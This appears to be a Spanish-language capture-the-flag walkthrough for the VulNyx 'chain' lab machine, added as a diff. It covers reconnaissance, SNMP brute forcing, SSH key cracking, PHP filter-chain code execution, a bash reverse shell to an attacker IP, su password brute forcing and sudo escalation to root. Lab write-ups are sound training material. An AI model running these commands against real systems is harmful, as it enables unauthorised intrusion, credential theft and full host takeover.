@@ -1,0 +1,165 @@
+>>>vulnyx
+>>chain
+
+# Primero escaneamos nuestro sistema para identificar la IP víctima
+
+# Escaneo de ARP para obtener la IP de la víctima
+arp-scan -I eth0 --localnet
+
+# Resultado del escaneo ARP
+(IP Victima)   08:00:27:40:34:47       PCS Systemtechnik GmbH
+
+# Escaneo de puertos con nmap
+nmap -p- --min-rate 2000 -vvv -n -Pn (IP Victima) -oN nmap
+
+# Resultados del escaneo: Puerto 80 abierto para Apache
+80/tcp open http Apache httpd 2.4.56 (Debian)
+
+# No encontramos mucho, revisamos vía UDP
+nmap -sU -p- --min-rate 2000 -sV (IP Victima)
+
+**
+UDP (User Datagram Protocol):
+
+UDP es uno de los protocolos de transporte en la capa de transporte del modelo OSI. A diferencia de TCP (Transmission Control Protocol), UDP es un protocolo sin conexión y no orientado a la conexión
+**
+
+# Resultados del escaneo UDP: Puerto 161 abierto para SNMP
+161/udp open snmp net-snmp; net-snmp SNMPv3 server
+
+**
+SNMP: es un protocolo estándar de la industria utilizado para gestionar y supervisar dispositivos de red, como routers, switches, servidores y otros dispositivos de red.
+**
+
+# Buscamos la clave de comunidad SNMP para obtener más información
+onesixtyone -c /home/kali/wordlists666/common-snmp-community-strings-onesixtyone.txt (IP Victima)
+
+# Resultado del escaneo SNMP
+192.168.200.8 [security] Linux chain 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+
+# Realizamos un walk SNMP y encontramos información
+snmpwalk -v 2c -c security (IP Victima) > grepear.txt
+
+# Asociamos el host a la IP y al ingresar vía web encontramos una frase e imagen de una cadena, la descargamos y analizamos
+strings chain.jpg
+
+# Dentro Encontramos un id_rsa, lo guardamos y lo crackeamos
+nano id_rsa
+**Guardamos el id_rsa**
+
+ssh2john id_rsa > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+# Contraseña crackeada: b****2 (id_rsa)
+
+# Realizamos fuzzing en la web
+gobuster dir -u http://chaincorp.nyx -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+
+# Resultados del fuzzing
+/wordpress
+/javascript
+/server-status
+
+# Intentamos fizzing de subdominios para obtener acceso
+wfuzz -c --hc=400 --hl=11 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -H "Host: http://FUZZ.chaincorp.nyx" -u (IP Victima)
+
+# Encontramos el subdominio "utils.chaincorp.nyx", lo añadimos al /etc/hosts
+nano /etc/hosts
+
+(IP Victima) utils.chaincorp.nyx
+
+# Al ingresar, vemos una nueva página con varias carpetas
+id(http://utils.chaincorp.nyx/include.php?in=id.php)
+ip
+ps
+ss
+uname
+uptime
+whoami(www-data)
+hostname(encontramos un user "chain")
+
+# El parametro "?in=id.php" puede indicar que es vulnerable a path traversal, probamos y en efecto, es vulnerable a path traversal
+http://utils.chaincorp.nyx/include.php?in=../../../../../../../../../../../../../../etc/passwd
+
+# Buscamos un exploit/script para explotar la vulnerabilidad, encontramos el siguiente
+https://github.com/synacktiv/php_filter_chain_generator
+
+# Generamos un payload malicioso y obtenemos información de phpinfo
+python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
+
+# Probamos obtener el usuario actual
+python3 php_filter_chain_generator.py --chain "<?php system('whoami'); ?>"
+www-data
+
+
+# Acceso al servidor, subimos una reverseshell
+nano index.html
+bash -i >& /dev/tcp/(IP atacante)/443 0>&1
+
+**
+Siempre que subamos el archivo automaticamente se llamara "index.html.1"
+Si borramos el "index.html" la maquina comenzara a dar errores
+**
+
+# Abrimos un servidor python y subimos el shell reverso
+python3 -m http.server 8080
+
+# Subimos el reverseshell
+python3 php_filter_chain_generator.py --chain "<?php system('wget (IP atacante)'); ?>"
+
+# Ejecutamos la reverseshell
+nc -nlvp 443
+python3 php_filter_chain_generator.py --chain "<?php system('bash index.html.1'); ?>"
+
+
+# Acceso a la reverseshell, tratamiento de la TTY
+script /dev/null -c bash
+control+Z
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+
+# Fuerza bruta a usuarios con scripts específicos
+suForce (D4t4s3c): https://github.com/d4t4s3c/suForce
+Sudo_BruteForce (maalfer A.K.A El pinguino de mario): https://github.com/Maalfer/Sudo_BruteForce
+
+# Descargamos los scripts y asignamos permisos
+cd /tmp
+wget https://raw.githubusercontent.com/d4t4s3c/suForce/master/Linux_Su_force.sh
+wget https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Sudo_BruteForce.sh
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt
+
+chmod 777 Linux_Su_force.sh
+chmod 777 Sudo_BruteForce.sh
+chmod 777 rockyou.txt
+
+# Realizamos fuerza bruta con distintos diccionarios
+./Linux_Su_Force.sh blue techyou.txt
+Contraseña encontrada para el usuario blue: s*****e
+
+# Accedemos como usuario blue
+su blue
+pass: s*****e
+
+# Subimos privilegios y obtenemos acceso como red
+sudo -l
+(red) NOPASSWD: /usr/bin/cpulimit
+
+# Ejecutamos script como red y generamos una bash
+sudo -u red ./cpulimit -l 100 -f -- /bin/sh -p
+whoami
+red
+bash
+
+# Escalamos a root
+sudo -l
+(root) NOPASSWD: /usr/sbin/smokeping
+
+# Ejecutamos --man como sudo para obtener shell root
+sudo /usr/sbin/smokeping --man
+!/bin/bash
+whoami
+root
+
+# La opción --man en un script Perl se utiliza para mostrar la página de manual del módulo o función especificado.
